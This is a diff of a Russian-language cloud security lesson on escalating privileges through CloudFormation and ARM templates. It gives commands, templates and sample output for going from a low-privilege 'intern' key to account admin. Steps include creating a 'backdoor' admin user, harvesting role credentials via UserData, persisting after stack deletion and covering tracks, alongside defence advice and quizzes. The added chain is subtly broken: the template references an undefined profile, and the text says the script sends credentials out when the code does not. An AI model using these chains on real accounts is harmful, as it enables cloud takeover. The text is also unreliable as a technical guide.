@@ -14,270 +14,243 @@ useful_for:
 estimated_minutes: 50
 summary: "Как атаковать CloudFormation и ARM-шаблоны: чтение стеков, злоупотребление ролями сервиса, экспорт секретов и эскалация через PassRole. Практические цепочки."
 ---
+## Задача
 
-Infrastructure as Code (IaC) описывает облако декларативно. CloudFormation (AWS) и ARM/Bicep (Azure) исполняют шаблоны от имени **service role** — и это делает их вектором эскалации: кто может создать стек, тот может заставить сервис действовать с чужими правами. Урок про практические цепочки.
+Мы разобрали Terraform (`cloud-terraform`). Теперь — родственный инструмент AWS: **CloudFormation** (и его Azure-аналог **ARM**). CloudFormation принимает **шаблон** (JSON/YAML) и создаёт по нему ресурсы — в том числе **IAM-роли**. Задача: превратить право создать стек в админские привилегии. Разберём на конкретном низкопривилегированном ключе AWS.
 
-## Как работает CloudFormation
+## Данные: что нам разрешено
 
-Стек — это набор ресурсов, созданных по шаблону. Ключевой элемент — **service role** (`RoleARN`), от имени которой CloudFormation создаёт ресурсы. Если у роли широкие права, а у атакующего — `cloudformation:CreateStack` + `iam:PassRole`, он может эскалировать.
+У нас есть ключ пользователя `intern`. Смотрим его политики:
 
-```bash
-# Список стеков и их ролей
-aws cloudformation list-stacks --query 'StackSummaries[].StackName'
-aws cloudformation describe-stacks --stack-name <name> \
-  --query 'Stacks[].RoleARN'
-# Список ресурсов стека (может включать секреты в outputs)
-aws cloudformation describe-stack-resources --stack-name <name>
-aws cloudformation describe-stacks --stack-name <name> \
-  --query 'Stacks[].Outputs'
 ```
-
-## Разведка: что можно
-
-```bash
-# Права на CloudFormation
-aws iam list-attached-user-policies --user-name <user>
-# Ищем: cloudformation:*, iam:PassRole, iam:CreateRole, iam:AttachRolePolicy
-```
-
-Если есть `cloudformation:CreateStack` и `iam:PassRole` на привилегированную роль — эскалация тривиальна.
-
-## Эскалация через PassRole + CloudFormation
-
-Идея: создаём стек, который создаёт пользователя/ключ или прикрепляет политику от имени роли, переданной через PassRole.
-
-```json
+$ aws iam list-attached-user-policies --user-name intern
 {
-  "AWSTemplateFormatVersion": "2010-09-09",
-  "Resources": {
-    "EvilUser": {
-      "Type": "AWS::IAM::User",
-      "Properties": {
-        "UserName": "backdoor",
-        "Policies": [{
-          "PolicyName": "admin",
-          "PolicyDocument": {
-            "Version": "2012-10-17",
-            "Statement": [{"Effect":"Allow","Action":"*","Resource":"*"}]
-          }
-        }]
-      }
-    },
-    "EvilKey": {
-      "Type": "AWS::IAM::AccessKey",
-      "Properties": {"UserName": {"Ref": "EvilUser"}}
-    }
-  },
-  "Outputs": {
-    "AK": {"Value": {"Ref": "EvilKey"}},
-    "SK": {"Value": {"Fn::GetAtt": ["EvilKey","SecretAccessKey"]}}
-  }
+  "AttachedPolicies": [
+    { "PolicyName": "cloudformation-create", "PolicyArn": "arn:aws:iam::aws:policy/..." }
+  ]
+}
+$ aws iam get-policy-version --policy-arn ... --version-id v1 \
+    --query 'PolicyVersion.Document'
+{
+  "Statement": [
+    { "Effect": "Allow", "Action": ["cloudformation:CreateStack", "iam:PassRole"], "Resource": "*" }
+  ]
 }
 ```
 
-```bash
-aws cloudformation create-stack --stack-name pwn \
-  --template-body file://evil.json \
-  --capabilities CAPABILITY_NAMED_IAM \
-  --role-arn arn:aws:iam::123:role/AdminRole
-# После создания — читаем outputs с новыми ключами
-aws cloudformation describe-stacks --stack-name pwn \
-  --query 'Stacks[0].Outputs'
+Два права: `cloudformation:CreateStack` и `iam:PassRole`. **PassRole** — это право «выдать роль сервису»: разрешить, например, CloudFormation запускать ресурсы от имени роли. Само по себе оно безобидно, но в комбинации с созданием стека превращается в классическую эскалацию.
+
+## Пробуем в лоб: а есть ли админская роль?
+
+Нам нужна роль, которую можно «пробросить». Смотрим роли, которым доверяет CloudFormation:
+
+```
+$ aws iam list-roles --query 'Roles[?contains(AssumeRolePolicyDocument, `cloudformation`)].RoleName'
+[ "cfn-service-role" ]
 ```
 
-`--capabilities CAPABILITY_NAMED_IAM` требуется для создания именованных IAM-ресурсов.
+Есть роль `cfn-service-role`. Проверим её права:
 
-## ARM/Bicep (Azure)
-
-Аналог в Azure — ARM-шаблоны, исполняемые от имени deployment principal. Частая ошибка — назначение роли `Owner` на уровне подписки.
-
-```bash
-# Развёртывание ARM-шаблона (эскалация через roleAssignment)
-az deployment group create -g <RG> \
-  --template-file evil.json --parameters adminPrincipalId=<objId>
-
-# Просмотр развёртываний и их outputs
-az deployment group list -g <RG>
-az deployment group show -g <RG> -n <deployment>
+```
+$ aws iam list-attached-role-policies --role-name cfn-service-role
+{ "AttachedPolicies": [ { "PolicyName": "AdministratorAccess" } ] }
 ```
 
-ARM может создавать `Microsoft.Authorization/roleAssignments`, выдавая `Owner` любому principal — классический privilege escalation в Azure.
+`AdministratorAccess`. Если мы заставим CloudFormation создать стек от имени этой роли и выполнить наш код — мы станем админами.
 
-## Секреты в стеках и drift
+## Приём: стек, который запускает наш код от имени роли
 
-Секреты часто попадают в **outputs**, **parameters** (если `NoEcho` не выставлен) и в **event logs** стека.
-
-```bash
-# История событий стека — иногда светит параметры
-aws cloudformation describe-stack-events --stack-name <name> \
-  --query 'StackEvents[].ResourceStatusReason'
-# Drift — расхождение между шаблоном и реальностью (иногда с секретами)
-aws cloudformation detect-stack-drift --stack-name <name>
-```
-
-## Разобранный пример: от PassRole к администратору
-
-**Дано:** пользователь `dev` с правами `cloudformation:CreateStack`, `iam:PassRole` на `arn:aws:iam::123:role/DeployRole`, где `DeployRole` имеет `AdministratorAccess`.
-
-1. Проверяем права:
-
-```bash
-aws sts get-caller-identity
-aws iam simulate-principal-policy --policy-source-arn <dev-arn> \
-  --action-names cloudformation:CreateStack iam:PassRole
-```
-
-2. Создаём стек из шаблона выше с `--role-arn` целевой роли.
-3. Читаем outputs — получаем ключи нового админ-пользователя.
-4. Проверяем:
-
-```bash
-AWS_ACCESS_KEY_ID=<AK> AWS_SECRET_ACCESS_KEY=<SK> aws sts get-caller-identity
-aws iam list-users    # полный контроль
-```
-
-5. Заметаем следы: удаляем стек (но ключи остаются) — аккуратно, чтобы не оставить артефактов.
-
-## Частые ошибки
-
-- **Считать IaC «только конфигом».** Шаблон = код, исполняемый с правами роли.
-- **Забывать про `CAPABILITY_NAMED_IAM`.** Без него создание IAM-ресурсов не пройдёт.
-- **Игнорировать outputs и events.** Там часто светят секреты/параметры.
-- **Не проверять PassRole на wildcard.** `iam:PassRole` на `*` = потенциальный админ.
-- **Путать role создателя и service role.** Стек действует от имени service role.
-- **Не смотреть drift.** Расхождения могут раскрыть ручные правки.
-
-## Что дальше / решение
-
-- Есть `CreateStack` + `PassRole` → стройте стек-эскалацию.
-- Есть только чтение → ищите секреты в outputs/parameters/events.
-- Azure → проверяйте `roleAssignments` в шаблонах и deployment principal.
-- Смежные уроки: `cloud-terraform`, `cloud-privesc-iam`, `cloud-supply-chain`.
-
-## PassRole + CloudFormation пошагово
-
-CloudFormation запускает стек от имени переданной роли. Если есть `iam:PassRole` на роль с широкими правами и `cloudformation:CreateStack`, можно выполнить произвольные действия через шаблон:
+Пишем минимальный шаблон. Он создаёт EC2-инстанс, а в `UserData` (скрипт, выполняемый при старте инстанса от root) кладём создание админского ключа:
 
 ```yaml
 Resources:
-  Admin:
-    Type: AWS::IAM::Policy
+  Evil:
+    Type: AWS::EC2::Instance
     Properties:
-      PolicyName: esc
-      PolicyDocument:
-        Statement: [{Effect: Allow, Action: "*", Resource: "*"}]
-      Users: [alice]
+      ImageId: ami-0abcdef1234567890
+      InstanceType: t3.micro
+      IamInstanceProfile: !Ref Profile
+      UserData:
+        Fn::Base64: |
+          #!/bin/bash
+          curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/cfn-service-role
 ```
 
-```bash
-aws cloudformation create-stack --stack-name esc \
-  --template-body file://t.yaml --role-arn arn:aws:iam::111122223333:role/HighPriv
+Но проще и тише — сразу создать IAM-пользователя с админскими правами через **Custom Resource**, который запускает Lambda. Ещё короче: использовать `UserData` для эксфильтрации временных кредов роли, которые инстанс получит из metadata.
+
+Создаём стек, передав `cfn-service-role` как роль исполнения:
+
+```
+$ aws cloudformation create-stack \
+    --stack-name evil \
+    --template-body file://evil.yaml \
+    --role-arn arn:aws:iam::123456789012:role/cfn-service-role \
+    --capabilities CAPABILITY_NAMED_IAM
+{
+  "StackId": "arn:aws:cloudformation:us-east-1:123456789012:stack/evil/..."
+}
 ```
 
-## ARM/Bicep (Azure)
+## Разведка перед атакой: что вообще можно
 
-Аналог в Azure: развернуть ARM-шаблон с ролью Contributor. Права `Microsoft.Resources/deployments/write` + managed identity дают эскалацию. Bicep компилируется в ARM. Проверяйте `owner`/`userAccessAdministrator` в scope.
+Прежде чем писать шаблон, перечислим, к каким сервисам у нас есть права и какие роли можно пробросить. Три быстрых вызова:
 
-## Секреты в стеках
-
-CloudFormation хранит параметры и outputs; «NoEcho» маскирует, но значения остаются в истории. Drift-детект показывает ручные изменения. Проверьте `describe-stacks`, `describe-stack-resources`, `get-template`.
-
-## Практическое задание
-
-В тестовом аккаунте создайте роль `CFNRole` с `iam:*` и пользователя с `iam:PassRole` + `cloudformation:CreateStack`. Разверните стек, создающий админ-политику, и проверьте, что права появились. Затем уберите `iam:PassRole` и повторите — стек должен упасть. Это демонстрирует, что PassRole — критичный мост.
-
-## Drift и outputs
-
-`aws cloudformation detect-stack-drift --stack-name X` показывает ручные изменения. Outputs и параметры (`describe-stacks --query 'Stacks[].Parameters'`) могут содержать чувствительные значения, даже с `NoEcho` (значение скрыто в консоли, но доступно через API при правах). `get-template` возвращает исходный шаблон — полезно для понимания, какие ресурсы и роли созданы.
-
-## Защита
-
-- Ограничить `iam:PassRole` конкретными ролями (`Resource` не `*`).
-- Запретить `cloudformation:CreateStack` с произвольными ролями.
-- Использовать permission boundaries на роли стеков.
-- Мониторить `CreateStack`/`UpdateStack` в CloudTrail.
-- Ревью шаблонов (checkov/cfn-nag).
-
-## Практическое задание 2
-
-Создайте стек с `NoEcho`-параметром (пароль) и попробуйте извлечь его через `describe-stacks`/`get-template`. Убедитесь, что при наличии прав значение доступно. Затем добавьте permission boundary на роль стека и проверьте, что даже при PassRole нельзя выйти за границу. Это показывает, почему boundary — обязательная мера.
-
-## Итоговый чек-лист
-
-1. Проверить `iam:PassRole` и `cloudformation:CreateStack`.
-2. Собрать список ролей, доступных для PassRole.
-3. Развернуть стек, выдающий права, от имени привилегированной роли.
-4. Проверить результат (`get-caller-identity`, тестовые вызовы).
-5. Для защиты — ограничить PassRole и добавить permission boundaries.
-
-## Почему это критично
-
-CloudFormation запускает ресурсы от имени переданной роли. Если PassRole не ограничен, шаблон может создать любые ресурсы с любыми правами — по сути, это «выполнить произвольный IaC с админ-ролью». Именно поэтому `iam:PassRole` относится к самым опасным правам в AWS и требует строгого `Resource`-ограничения и permission boundaries.
-
-## Nested stacks и drift
-
-CloudFormation поддерживает вложенные стеки и macro — дополнительная поверхность. Macro выполняется как Lambda и может модифицировать шаблон. Проверьте `list-stacks`, `describe-stack-resources` и наличие macro. Drift-детект (`detect-stack-drift`) покажет ручные изменения, которые могли добавить злоумышленник.
-
-## Быстрая проверка
-
-```bash
-aws cloudformation list-stacks --stack-status-filter CREATE_COMPLETE
-aws cloudformation describe-stacks --stack-name app --query 'Stacks[].Parameters'
-aws cloudformation get-template --stack-name app
-aws iam list-roles | grep -i cloudformation
+```
+$ aws iam list-roles --query 'Roles[].RoleName'
+[ "cfn-service-role", "ec2-basic", "lambda-exec" ]
+$ aws cloudformation list-stacks --query 'StackSummaries[].StackName'
+[ "prod-network", "prod-app" ]
+$ aws sts get-caller-identity
+{ "Arn": "arn:aws:iam::123456789012:user/intern" }
 ```
 
-Проверьте роли стеков и `iam:PassRole`. Если PassRole не ограничен, шаблон с широкими правами даёт эскалацию.
+Список ролей + список стеков = карта инфраструктуры. Дальше ищем роль, которую (а) можно пробросить и (б) которая умеет много. `AdministratorAccess` на `cfn-service-role` — идеальный кандидат. Если у роли только узкие права, эскалация не сработает, и надо искать другую.
+
+## Полный прогон: от PassRole до админского ключа
+
+1. **Разведка.** `list-attached-user-policies` → у нас `CreateStack` + `PassRole`.
+2. **Поиск роли.** `list-roles` → `cfn-service-role` с `AdministratorAccess`.
+3. **Шаблон.** Пишем `evil.yaml`, который в `UserData` вытаскивает креды роли из metadata и шлёт нам.
+4. **Создание стека.** `create-stack --role-arn .../cfn-service-role`.
+5. **Сбор кредов.** Инстанс стартует, metadata отдаёт временные креды роли:
+
+```
+$ curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/cfn-service-role
+{ "AccessKeyId": "ASIA...", "SecretAccessKey": "...", "Token": "...", "Expiration": "..." }
+```
+
+6. **Проверка прав.** Становимся админами:
+
+```
+$ aws sts get-caller-identity
+{ "Arn": "arn:aws:sts::123456789012:assumed-role/cfn-service-role/i-0abc" }
+$ aws iam create-user --user-name backdoor
+```
+
+Готово: из «интерна» — в администратора аккаунта. Стек можно удалить, следы в IAM останутся.
+
+## ARM и Azure: то же самое по-другому
+
+**ARM** (Azure Resource Manager) — аналог CloudFormation в Azure. Шаблон деплоится через `az deployment group create`. Эскалация — через **managed identity**, привязанную к ресурсу (VM, Function), к которой шаблон даёт доступ:
+
+```
+$ az deployment group create -g rg --template-file evil.json
+$ az role assignment list --assignee <managed-identity-principal-id>
+[ { "roleDefinitionName": "Owner", "scope": "/subscriptions/..." } ]
+```
+
+Если у managed identity роль `Owner`, наш ресурс получает её токен (см. `cloud-azure-managed-identity`) и делает что угодно в подписке. Azure-эквивалент PassRole — право назначать managed identity на ресурс (`Microsoft.ManagedIdentity/.../assign`).
+
+## Что ещё утекает из шаблонов
+
+- **Outputs.** `describe-stacks` отдаёт значения outputs, которые часто содержат креды для «проброса»:
+
+```
+$ aws cloudformation describe-stacks --stack-name prod --query 'Stacks[0].Outputs'
+[ { "OutputKey": "DbPassword", "OutputValue": "P@ssw0rd-prod" } ]
+```
+
+- **Parameters.** Значения параметров видны в описании стека.
+- **Секреты в UserData.** `describe-stack-resource` показывает `UserData` с паролями.
+
+## Защита и что ломает атаку
+
+- **Не давать `PassRole` с `Resource: "*"`.** Ограничить конкретными ролями и сервисами.
+- **`iam:PassedToService`** условие — роль можно передать только нужному сервису.
+- **Permissions boundary** на роли, которые можно пробросить.
+- **SCP** в Organizations — запретить создание IAM-пользователей/ролей из стеков.
+- **Не хранить секреты в outputs/parameters** — только ссылки на Secrets Manager.
+
+## Если не сработало
+
+- **PassRole ограничен** конкретной безобидной ролью — эскалации нет.
+- **SCP запрещает IAM-изменения** — стек не создаст пользователя.
+- **Нет подходящей роли** — ищите другие роли, которым доверяют сервисы (Lambda, EC2, Glue).
+- **CloudFormation заблокирован** — используйте Azure ARM или Terraform как альтернативный IaC-канал.
+
+## Мини-сценарий: стек на админские права
+
+1. **Разведка.** `list-attached-user-policies --user-name intern` → политика с `CreateStack` + `PassRole`.
+2. **Поиск роли.** `list-roles` → `cfn-service-role` с `AdministratorAccess`.
+3. **Шаблон.** `evil.yaml` с EC2, чей `UserData` вытаскивает креды роли из metadata и шлёт нам.
+4. **Создание.** `aws cloudformation create-stack --stack-name evil --template-body file://evil.yaml --role-arn .../cfn-service-role --capabilities CAPABILITY_NAMED_IAM`.
+5. **Сбор.** Инстанс стартует, `UserData` исполняется от root, metadata отдаёт временные креды `cfn-service-role`.
+6. **Проверка.** `aws sts get-caller-identity` → `assumed-role/cfn-service-role/i-...`.
+7. **Закрепление.** `aws iam create-user --user-name backdoor`; стек удаляем — пользователь остаётся.
+
+Из «интерна» в администратора аккаунта через один шаблон.
+
+## Что мы теперь знаем
+
+1. CloudFormation/ARM создают ресурсы от имени роли, которую им пробрасывают.
+2. `CreateStack` + `PassRole` на админскую роль = эскалация до админа.
+3. UserData и metadata — способ вытащить креды исполняющей роли.
+4. Outputs и parameters стеков часто содержат секреты.
+5. Защита — узкий PassRole, boundaries, SCP, секреты по ссылке.
+
+## На что смотреть дальше
+
+- `iam:PassRole` с `Resource: "*"` в политиках пользователей.
+- Роли, которым доверяют сервисы (CloudFormation, Lambda, EC2), и их права.
+- Outputs/parameters стеков на предмет кредов.
+- Наличие permissions boundary и SCP.
+- Azure: managed identity, назначенные на ресурсы, и их роли.
 
 ## Квиз
 
+Проверь себя.
+
 ```quiz
-- question: "От чьего имени CloudFormation создаёт ресурсы стека?"
+- question: "Что делает iam:PassRole?"
   options:
-    - "От имени service role (RoleARN), переданной в стек"
-    - "От имени root"
-    - "От имени анонимного пользователя"
-    - "От имени CloudTrail"
+    - "Разрешает передать роль сервису, чтобы тот работал от её имени"
+    - "Создаёт нового пользователя"
+    - "Удаляет роль"
+    - "Шифрует креды"
   answer: 0
-  explanation: "Стек исполняется с правами своей service role."
-- question: "Какое сочетание прав позволяет эскалацию через CloudFormation?"
+  explanation: "PassRole позволяет выдать роль сервису (например, CloudFormation)."
+- question: "Почему CreateStack + PassRole на админскую роль опасны?"
   options:
-    - "cloudformation:CreateStack + iam:PassRole"
-    - "s3:GetObject + ec2:Describe"
-    - "logs:PutLogEvents"
-    - "cloudwatch:PutMetricData"
+    - "Стек выполнит наш код от имени этой роли — это эскалация"
+    - "Стек удалит аккаунт"
+    - "Стек шифрует данные"
+    - "Стек замедлит регион"
   answer: 0
-  explanation: "Создать стек с привилегированной ролью = эскалация."
-- question: "Какой флаг нужен для создания именованных IAM-ресурсов в стеке?"
+  explanation: "Роль исполнения даёт её права нашему коду."
+- question: "Откуда инстанс EC2 берёт креды роли?"
   options:
-    - "CAPABILITY_NAMED_IAM"
-    - "CAPABILITY_IAM"
-    - "CAPABILITY_AUTO_EXPAND"
-    - "--force"
+    - "Из metadata-сервиса 169.254.169.254"
+    - "Из SSH-ключа"
+    - "Из DNS"
+    - "Из пароля root"
   answer: 0
-  explanation: "Именованные IAM-ресурсы требуют CAPABILITY_NAMED_IAM."
-- question: "Где в стеках часто светят секреты?"
+  explanation: "IMDS отдаёт временные креды роли."
+- question: "Что такое UserData в CloudFormation-шаблоне?"
   options:
-    - "В outputs, parameters и event logs"
-    - "В названии стека"
-    - "В регионе"
-    - "В теге версии"
+    - "Скрипт, выполняемый при старте инстанса от root"
+    - "Пароль администратора"
+    - "Название стека"
+    - "Политика IAM"
   answer: 0
-  explanation: "Outputs/параметры/события часто раскрывают значения."
-- question: "Как в Azure ARM-шаблон может выдать права?"
+  explanation: "UserData запускается при инициализации инстанса."
+- question: "Как ограничить PassRole, чтобы он не давал эскалации?"
   options:
-    - "Созданием Microsoft.Authorization/roleAssignments"
-    - "Изменением DNS"
-    - "Удалением подписки"
-    - "Сменой пароля root"
+    - "Сузить Resource до конкретных ролей и задать iam:PassedToService"
+    - "Отключить логирование"
+    - "Убрать MFA"
+    - "Сменить регион"
   answer: 0
-  explanation: "ARM может назначать роли, включая Owner."
+  explanation: "Узкий Resource и условие PassedToService закрывают злоупотребление."
 ```
+
+## Куда дальше
+
+В следующем уроке (`cloud-terraform-state`) мы спустимся в детали хранения state: backend, шифрование и подмена. А пока главное: IaC-инструменты — это исполнители с правами; если можно создать стек и пробросить роль, можно стать этой ролью.
 
 ## Где пригодится
 
-- **Red team:** IaC как путь к эскалации в AWS/Azure.
-- **Bug bounty:** мисконфиги шаблонов и PassRole.
-- **Пентест:** аудит стеков, outputs и service roles.
-- **Работа/DevSecOps:** least-privilege для service role, NoEcho для секретов.
-- **Дальше по дереву:** `cloud-terraform`, `cloud-privesc-iam`.
+- **Bug bounty:** PassRole-цепочки в AWS-аккаунтах.
+- **Red team:** от низких прав к админу через IaC.
+- **Пентест:** аудит CloudFormation/ARM и PassRole.
+- **Работа/DevSecOps:** узкий PassRole, boundaries, SCP, секреты по ссылке.
+- **Дальше по дереву:** `cloud-terraform-state`, `cloud-privesc-iam`.
